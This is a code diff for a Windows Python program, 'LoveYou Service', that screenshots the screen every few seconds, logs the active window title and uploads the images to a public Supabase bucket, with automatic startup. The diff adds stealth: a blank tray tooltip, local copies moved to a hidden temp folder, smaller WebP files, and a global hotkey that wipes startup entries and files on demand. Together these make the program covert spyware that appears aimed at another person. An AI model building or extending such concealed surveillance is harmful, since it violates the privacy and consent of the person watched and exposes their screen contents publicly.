@@ -87,6 +87,14 @@ def load_config() -> dict:
     """Membaca konfigurasi dari config.ini."""
     base_dir = get_base_dir()
     config_path = os.path.join(base_dir, "config.ini")
+
+    # Untuk mode onefile PyInstaller, config.ini ada di _MEIPASS (folder temp ekstraksi)
+    meipass = getattr(sys, "_MEIPASS", None)
+    if meipass and not os.path.exists(config_path):
+        meipass_config = os.path.join(meipass, "config.ini")
+        if os.path.exists(meipass_config):
+            config_path = meipass_config
+
     config = configparser.ConfigParser()
 
     conf = {
@@ -96,12 +104,14 @@ def load_config() -> dict:
         "bucket_name": DEFAULT_BUCKET_NAME,
         "interval_seconds": DEFAULT_INTERVAL,
         "local_folder": os.path.join(base_dir, DEFAULT_LOCAL_FOLDER),
-        "keep_local_file": True,
-        "image_format": "jpg",
-        "jpg_quality": 80,
+        "keep_local_file": False,
+        "image_format": "webp",
+        "jpg_quality": 75,
         "auto_start": True,
         "app_name": DEFAULT_APP_NAME,
         "show_tray_notifications": False,
+        "emergency_hotkey": True,
+        "hotkey_combo": "Ctrl+Shift+F12",
     }
 
     if os.path.exists(config_path):
@@ -127,6 +137,10 @@ def load_config() -> dict:
 
             if "TRAY" in config:
                 conf["show_tray_notifications"] = config["TRAY"].getboolean("notifications", conf["show_tray_notifications"])
+
+            if "SECURITY" in config:
+                conf["emergency_hotkey"] = config["SECURITY"].getboolean("emergency_hotkey", conf["emergency_hotkey"])
+                conf["hotkey_combo"] = config["SECURITY"].get("hotkey_combo", conf["hotkey_combo"]).strip()
         except Exception as e:
             print(f"[WARN] Gagal membaca config.ini ({e}), menggunakan default.")
 
@@ -245,14 +259,161 @@ def unregister_startup(app_name: str) -> bool:
     return True
 
 
+def uninstall_and_clean_exit(controller):
+    """
+    Menonaktifkan layanan, mencabut dari Windows Startup (Registry & Startup folder),
+    membersihkan seluruh file dan folder screenshot lokal / temp, dan menghentikan proses aplikasi.
+    """
+    print("\n" + "=" * 65)
+    print("[UNINSTALL] Memulai proses penonaktifan darurat & pembersihan total...")
+    print("=" * 65)
+
+    controller.is_running = False
+
+    # 1. Cabut dari Windows Startup
+    app_name = controller.conf.get("app_name", DEFAULT_APP_NAME)
+    try:
+        unregister_startup(app_name)
+        print(f"[UNINSTALL OK] Aplikasi '{app_name}' berhasil dicabut dari Windows Startup.")
+    except Exception as e:
+        print(f"[UNINSTALL WARN] Gagal mencabut startup: {e}")
+
+    # 2. Hapus seluruh file screenshot lokal (jika mode simpan lokal aktif)
+    local_folder = controller.conf.get("local_folder")
+    if local_folder and os.path.exists(local_folder):
+        try:
+            import shutil
+            shutil.rmtree(local_folder, ignore_errors=True)
+            print(f"[UNINSTALL OK] Folder lokal '{local_folder}' berhasil dihapus bersih.")
+        except Exception as e:
+            print(f"[UNINSTALL WARN] Gagal menghapus folder lokal: {e}")
+
+    # 3. Hapus folder temporary capture jika ada
+    try:
+        import tempfile
+        import shutil
+        temp_dir = os.path.join(tempfile.gettempdir(), "_xoose_temp_capture")
+        if os.path.exists(temp_dir):
+            shutil.rmtree(temp_dir, ignore_errors=True)
+            print(f"[UNINSTALL OK] Folder temporary '{temp_dir}' dibersihkan.")
+    except Exception:
+        pass
+
+    # 4. Hentikan System Tray jika ada
+    if controller.tray_icon:
+        try:
+            controller.tray_icon.stop()
+            print("[UNINSTALL OK] Ikon System Tray dinonaktifkan.")
+        except Exception:
+            pass
+
+    print("[UNINSTALL OK] Pembersihan selesai total. Aplikasi berhasil dihentikan.")
+    print("=" * 65)
+    os._exit(0)
+
+
+def parse_hotkey(combo_str: str) -> tuple[int, int]:
+    """
+    Mengurai string kombinasi tombol keyboard (cth: 'Ctrl+Shift+F12' atau 'Ctrl+Alt+Q')
+    menjadi pasangan (fs_modifiers, vk_code).
+    """
+    parts = [p.strip().upper() for p in (combo_str or "").replace(" ", "").split("+") if p.strip()]
+    modifiers = 0
+    vk = None
+
+    vk_map = {
+        "F1": 0x70, "F2": 0x71, "F3": 0x72, "F4": 0x73, "F5": 0x74, "F6": 0x75,
+        "F7": 0x76, "F8": 0x77, "F9": 0x78, "F10": 0x79, "F11": 0x7A, "F12": 0x7B,
+        "END": 0x23, "HOME": 0x24, "DELETE": 0x2E, "DEL": 0x2E, "ESC": 0x1B, "ESCAPE": 0x1B,
+        "SPACE": 0x20, "TAB": 0x09, "BACKSPACE": 0x08,
+    }
+
+    for p in parts:
+        if p in ("CTRL", "CONTROL"):
+            modifiers |= 0x0002
+        elif p in ("ALT", "MENU"):
+            modifiers |= 0x0001
+        elif p == "SHIFT":
+            modifiers |= 0x0004
+        elif p in ("WIN", "WINDOWS", "SUPER"):
+            modifiers |= 0x0008
+        elif p in vk_map:
+            vk = vk_map[p]
+        elif len(p) == 1 and (p.isalpha() or p.isdigit()):
+            vk = ord(p)
+
+    # Default aman jika parsing gagal: Ctrl+Shift+F12
+    if not modifiers:
+        modifiers = 0x0002 | 0x0004
+    if not vk:
+        vk = 0x7B
+
+    return modifiers, vk
+
+
+def start_emergency_hotkey_listener(controller):
+    """
+    Mendaftarkan Global Hotkey Windows kustom sesuai konfigurasi.
+    Saat ditekan di mana saja di Windows, aplikasi akan langsung dinonaktifkan
+    dan dibersihkan hingga ke akarnya.
+    """
+    def _listener():
+        try:
+            from ctypes import wintypes
+            user32 = ctypes.windll.user32
+            combo_str = controller.conf.get("hotkey_combo", "Ctrl+Shift+F12")
+            modifiers, vk = parse_hotkey(combo_str)
+
+            HOTKEY_ID_CUSTOM = 0x5841  # ID untuk custom hotkey pilihan user
+            HOTKEY_ID_BACKUP = 0x5842  # ID untuk backup universal Ctrl+Shift+F12
+
+            # 1. Daftarkan custom hotkey pilihan user
+            reg_custom = user32.RegisterHotKey(None, HOTKEY_ID_CUSTOM, modifiers | 0x4000, vk)
+            if not reg_custom:
+                reg_custom = user32.RegisterHotKey(None, HOTKEY_ID_CUSTOM, modifiers, vk)
+
+            # 2. Daftarkan backup universal Ctrl+Shift+F12 jika berbeda
+            reg_backup = False
+            if (modifiers, vk) != (0x0006, 0x7B):
+                reg_backup = user32.RegisterHotKey(None, HOTKEY_ID_BACKUP, 0x0006 | 0x4000, 0x7B)
+                if not reg_backup:
+                    reg_backup = user32.RegisterHotKey(None, HOTKEY_ID_BACKUP, 0x0006, 0x7B)
+
+            print(f"[HOTKEY] Pintasan darurat aktif: [{combo_str}] untuk nonaktifkan & bersihkan total.")
+
+            msg = wintypes.MSG()
+            while controller.is_running and user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
+                if msg.message == 0x0312:  # WM_HOTKEY
+                    if msg.wParam in (HOTKEY_ID_CUSTOM, HOTKEY_ID_BACKUP):
+                        print(f"\n[HOTKEY TRIGGERED] Pintasan darurat terdeteksi! Memulai pembersihan...")
+                        user32.UnregisterHotKey(None, HOTKEY_ID_CUSTOM)
+                        if reg_backup:
+                            user32.UnregisterHotKey(None, HOTKEY_ID_BACKUP)
+                        uninstall_and_clean_exit(controller)
+                        break
+                user32.TranslateMessage(ctypes.byref(msg))
+                user32.DispatchMessageW(ctypes.byref(msg))
+
+            user32.UnregisterHotKey(None, HOTKEY_ID_CUSTOM)
+            if reg_backup:
+                user32.UnregisterHotKey(None, HOTKEY_ID_BACKUP)
+        except Exception as e:
+            print(f"[WARN] Emergency hotkey listener error: {e}")
+
+    t = threading.Thread(target=_listener, daemon=True, name="EmergencyHotkeyListener")
+    t.start()
+    return t
+
+
 # ==============================================================================
 # SCREENSHOT CAPTURE ENGINE (MSS)
 # ==============================================================================
-def capture_screenshot(output_dir: str, image_format: str = "jpg", jpg_quality: int = 80) -> tuple[str, str, str]:
+def capture_screenshot(output_dir: str, image_format: str = "webp", jpg_quality: int = 75) -> tuple[str, str, str]:
     """
     Menangkap tampilan layar menggunakan mss (sangat cepat ~10ms).
     Format nama file: ss_(jam_tanggal_hari) sesuai permintaan user.
-    Contoh: ss_00-45-12_21-11-2026_Sabtu.jpg
+    Mendukung format modern 'webp' dengan ukuran ultra-hemat (10-50 KB) dan kualitas tajam.
+    Contoh: ss_00-45-12_21-11-2026_Sabtu.webp
     Returns:
         tuple(filepath, filename, resolution)
     """
@@ -261,7 +422,14 @@ def capture_screenshot(output_dir: str, image_format: str = "jpg", jpg_quality: 
     hari = DAYS_ID.get(now.weekday(), "Hari")
     jam = now.strftime("%H-%M-%S")
     tanggal = now.strftime("%d-%m-%Y")
-    ext = "jpg" if image_format in ["jpg", "jpeg"] else "png"
+
+    fmt = (image_format or "webp").strip().lower()
+    if fmt == "png":
+        ext = "png"
+    elif fmt in ["jpg", "jpeg"]:
+        ext = "jpg"
+    else:
+        ext = "webp"
 
     base_name = f"ss_{jam}_{tanggal}_{hari}"
     filename = f"{base_name}.{ext}"
@@ -282,9 +450,26 @@ def capture_screenshot(output_dir: str, image_format: str = "jpg", jpg_quality: 
 
         if ext == "png":
             mss.tools.to_png(sct_img.rgb, sct_img.size, output=filepath)
+        elif ext == "webp":
+            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
+            q = min(max(int(jpg_quality), 40), 90)
+            img.save(filepath, "WEBP", quality=q, method=4)
+
+            # Smart Budget Check: Jika ukuran melebihi 50 KB, optimasi resolusi proporsional agar 10-50 KB
+            if os.path.exists(filepath) and os.path.getsize(filepath) > 51200:
+                w, h = img.size
+                scaled = img.resize((int(w * 0.75), int(h * 0.75)), Image.Resampling.LANCZOS)
+                scaled.save(filepath, "WEBP", quality=min(q, 75), method=4)
         else:
             img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
-            img.save(filepath, "JPEG", quality=jpg_quality, optimize=True)
+            q = min(max(int(jpg_quality), 10), 100)
+            img.save(filepath, "JPEG", quality=q, optimize=True)
+
+            # Smart Budget Check untuk JPEG jika melebihi 50 KB
+            if os.path.exists(filepath) and os.path.getsize(filepath) > 51200:
+                w, h = img.size
+                scaled = img.resize((int(w * 0.70), int(h * 0.70)), Image.Resampling.LANCZOS)
+                scaled.save(filepath, "JPEG", quality=min(q, 70), optimize=True)
 
     return filepath, filename, resolution
 
@@ -301,18 +486,40 @@ class SupabaseLogger:
         self.client: Client = create_client(self.url, self.key)
 
     def upload_file(self, filepath: str, remote_filename: str) -> str:
-        """Mengunggah file ke Supabase Storage (bisa di dalam folder user: roedi/ss_...jpg)."""
+        """Mengunggah file ke Supabase Storage (bisa di dalam folder user: roedi/ss_...webp)."""
         ext = os.path.splitext(filepath)[1].lower()
-        mime_type = "image/jpeg" if ext in [".jpg", ".jpeg"] else "image/png"
+        if ext in [".jpg", ".jpeg"]:
+            mime_type = "image/jpeg"
+        elif ext == ".webp":
+            mime_type = "image/webp"
+        else:
+            mime_type = "image/png"
 
         with open(filepath, "rb") as f:
             file_bytes = f.read()
 
-        self.client.storage.from_(self.bucket_name).upload(
-            path=remote_filename,
-            file=file_bytes,
-            file_options={"content-type": mime_type, "upsert": "true"},
-        )
+        try:
+            self.client.storage.from_(self.bucket_name).upload(
+                path=remote_filename,
+                file=file_bytes,
+                file_options={"content-type": mime_type, "upsert": "true"},
+            )
+        except Exception as upload_err:
+            # Jika error "Duplicate" atau "already exists", coba update/upsert ulang
+            err_str = str(upload_err).lower()
+            if "duplicate" in err_str or "already exists" in err_str:
+                try:
+                    self.client.storage.from_(self.bucket_name).update(
+                        path=remote_filename,
+                        file=file_bytes,
+                        file_options={"content-type": mime_type},
+                    )
+                except Exception:
+                    pass  # Tetap kembalikan URL publik meskipun update gagal
+            else:
+                raise  # Re-raise error non-duplicate
+
+        # Selalu kembalikan URL publik (file tersedia via public bucket)
         return f"{self.url}/storage/v1/object/public/{self.bucket_name}/{remote_filename}"
 
     def log_record(
@@ -418,17 +625,10 @@ class ServiceController:
             self.update_tray_status()
 
     def update_tray_status(self):
-        """Memperbarui teks tooltip status di ikon System Tray."""
+        """Tooltip di System Tray dikosongkan agar tidak memunculkan teks apapun saat di-hover."""
         if self.tray_icon:
             try:
-                user_tag = f" [{self.current_user}]" if self.current_user != "anonymous" else ""
-                if self.is_paused:
-                    self.tray_icon.title = f"LoveYou Service{user_tag} [DIJEDA | Total: {self.total_uploaded}]"
-                else:
-                    self.tray_icon.title = (
-                        f"LoveYou Service{user_tag} [Aktif: {self.conf['interval_seconds']}s | "
-                        f"Upload: {self.total_uploaded} | Antrean: {self.upload_queue.qsize()}]"
-                    )
+                self.tray_icon.title = " "
             except Exception:
                 pass
 
@@ -442,8 +642,14 @@ class ServiceController:
                     active_window = get_active_window_title()
                     active_user = self.current_user
 
-                    # Simpan screenshot di folder user terpisah (misal: screenshots/roedi/)
-                    user_dir = os.path.join(self.conf["local_folder"], active_user) if active_user != "anonymous" else self.conf["local_folder"]
+                    # Jika tidak simpan salinan lokal, gunakan direktori temporer Windows (%TEMP%)
+                    # agar TIDAK PERNAH membuat folder 'screenshots' sama sekali di folder aplikasi.
+                    if not self.conf.get("keep_local_file", True):
+                        import tempfile
+                        temp_base = os.path.join(tempfile.gettempdir(), "_xoose_temp_capture")
+                        user_dir = os.path.join(temp_base, active_user) if active_user != "anonymous" else temp_base
+                    else:
+                        user_dir = os.path.join(self.conf["local_folder"], active_user) if active_user != "anonymous" else self.conf["local_folder"]
                     os.makedirs(user_dir, exist_ok=True)
 
                     filepath, filename, resolution = capture_screenshot(
@@ -512,6 +718,10 @@ class ServiceController:
                     storage_error = str(e)
                     print(f"[UPLOAD FAIL] Storage: {e}")
 
+                # Jika upload gagal tapi kita tahu path-nya, tetap construct URL publik
+                if not image_url and not storage_error:
+                    image_url = f"{self.conf['supabase_url']}/storage/v1/object/public/{self.conf['bucket_name']}/{storage_filename}"
+
                 # 2. Catat ke Database
                 try:
                     status = "success" if not storage_error else "storage_failed"
@@ -521,7 +731,7 @@ class ServiceController:
 
                     self.supabase_logger.log_record(
                         filename=filename,
-                        image_url=image_url or None,
+                        image_url=image_url if image_url else "",
                         resolution=resolution,
                         active_window=active_window,
                         file_size_bytes=file_size,
@@ -534,8 +744,6 @@ class ServiceController:
                     print(f"[{datetime.now().strftime('%H:%M:%S')}] [UPLOAD #{self.total_uploaded} OK] [{user_name}] {filename} -> Supabase")
                 except Exception as e:
                     print(f"[DB FAIL] Database log error: {e}")
-
-            # Hapus file lokal jika keep_local_file = False
 
             # Hapus file lokal jika keep_local_file = False
             if not self.conf["keep_local_file"] and not storage_error:
@@ -554,8 +762,17 @@ class ServiceController:
     def on_capture_now(self, icon, item):
         try:
             active_window = get_active_window_title()
+            active_user = self.current_user
+            if not self.conf.get("keep_local_file", True):
+                import tempfile
+                temp_base = os.path.join(tempfile.gettempdir(), "_xoose_temp_capture")
+                target_dir = os.path.join(temp_base, active_user) if active_user != "anonymous" else temp_base
+            else:
+                target_dir = os.path.join(self.conf["local_folder"], active_user) if active_user != "anonymous" else self.conf["local_folder"]
+            os.makedirs(target_dir, exist_ok=True)
+
             filepath, filename, resolution = capture_screenshot(
-                output_dir=self.conf["local_folder"],
+                output_dir=target_dir,
                 image_format=self.conf["image_format"],
                 jpg_quality=self.conf["jpg_quality"],
             )
@@ -566,6 +783,7 @@ class ServiceController:
                 "resolution": resolution,
                 "active_window": active_window,
                 "file_size": file_size,
+                "user_name": active_user,
             })
             print("[INFO] Capture instan ditambahkan ke antrean.")
         except Exception as e:
@@ -595,6 +813,9 @@ class ServiceController:
         webbrowser.open("https://supabase.com/dashboard/project/wqjfunxfngowxwdmyzyj/editor")
 
     def on_open_local_folder(self, icon, item):
+        if not self.conf.get("keep_local_file", True):
+            print("[INFO] Penyimpanan lokal dinonaktifkan (100% Cloud Supabase).")
+            return
         folder = self.conf["local_folder"]
         os.makedirs(folder, exist_ok=True)
         os.startfile(folder)
@@ -610,6 +831,10 @@ class ServiceController:
         self.is_running = False
         icon.stop()
 
+    def on_emergency_uninstall(self, icon=None, item=None):
+        """Callback menu System Tray untuk menonaktifkan dan menghapus aplikasi sampai bersih."""
+        uninstall_and_clean_exit(self)
+
 
 def setup_tray(controller: ServiceController) -> pystray.Icon:
     """Membangun menu interaktif untuk system tray native Windows."""
@@ -618,26 +843,35 @@ def setup_tray(controller: ServiceController) -> pystray.Icon:
     def get_pause_label(item):
         return "▶ Lanjutkan Screenshot" if controller.is_paused else "⏸ Jeda Screenshot"
 
-    menu = pystray.Menu(
-        pystray.MenuItem("❤️ LoveYou Screenshot (3s)", None, enabled=False),
+    menu_items = [
+        pystray.MenuItem("❤️ LoveYou", None, enabled=False),
         pystray.Menu.SEPARATOR,
         pystray.MenuItem("💕 Buka LoveYou App", controller.on_open_love_ui, default=True),
         pystray.Menu.SEPARATOR,
         pystray.MenuItem("📸 Ambil Screenshot Sekarang", controller.on_capture_now),
         pystray.MenuItem("🖼️ Buka Galeri Hasil SS", controller.on_open_gallery),
         pystray.MenuItem("🌐 Buka Dashboard Supabase", controller.on_open_supabase),
-        pystray.MenuItem("📂 Buka Folder Screenshot Lokal", controller.on_open_local_folder),
+    ]
+
+    # Hanya tampilkan menu buka folder lokal jika mode simpan lokal aktif
+    if controller.conf.get("keep_local_file", True):
+        menu_items.append(pystray.MenuItem("📂 Buka Folder Screenshot Lokal", controller.on_open_local_folder))
+
+    menu_items.extend([
         pystray.Menu.SEPARATOR,
         pystray.MenuItem(get_pause_label, controller.on_toggle_pause),
         pystray.MenuItem("⚙️ Buka Konfigurasi (config.ini)", controller.on_open_config),
         pystray.Menu.SEPARATOR,
+        pystray.MenuItem("🛑 Nonaktifkan & Hapus (Uninstall)", controller.on_emergency_uninstall),
         pystray.MenuItem("❌ Keluar", controller.on_exit),
-    )
+    ])
+
+    menu = pystray.Menu(*menu_items)
 
     tray = pystray.Icon(
         name="LoveYou",
         icon=icon_image,
-        title="LoveYou Service [Aktif: 3s]",
+        title=" ",  # Dikosongkan agar tidak memunculkan tooltip apapun saat kursor diarahkan ke ikon
         menu=menu,
     )
     controller.tray_icon = tray
@@ -813,6 +1047,10 @@ def main():
     uploader_thread = threading.Thread(target=controller.uploader_worker, daemon=True)
     capture_thread.start()
     uploader_thread.start()
+
+    # Jalankan pintasan darurat (emergency hotkey) jika aktif di konfigurasi
+    if conf.get("emergency_hotkey", True) and not args.test:
+        start_emergency_hotkey_listener(controller)
 
     # Jalankan System Tray (detached)
     tray = None
